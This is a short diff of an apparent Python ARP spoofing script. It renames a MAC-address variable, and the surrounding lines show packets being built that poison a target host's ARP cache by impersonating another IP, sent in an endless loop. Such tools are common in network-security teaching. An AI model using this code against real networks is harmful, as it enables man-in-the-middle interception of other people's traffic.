@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-from uuid import getnode as get_mac
+from uuid import getnode
 from struct import pack
 from socket import socket, AF_PACKET, AF_INET, SOCK_RAW, SOCK_DGRAM
 import sys
@@ -121,11 +121,11 @@ def send(packet, interface):
 
 def main(interface, impersonated_host_ip, poisoned_host_ip):
     poisoned_host_mac = find_mac_by_ip(poisoned_host_ip)
-    impersonated_host_mac = get_mac()
+    our_mac = getnode()
 
     packet = create_arp_packet(sender_ip=impersonated_host_ip,
                                target_ip=poisoned_host_ip,
-                               sender_mac=impersonated_host_mac,
+                               sender_mac=our_mac,
                                target_mac=poisoned_host_mac)
     
     while True:
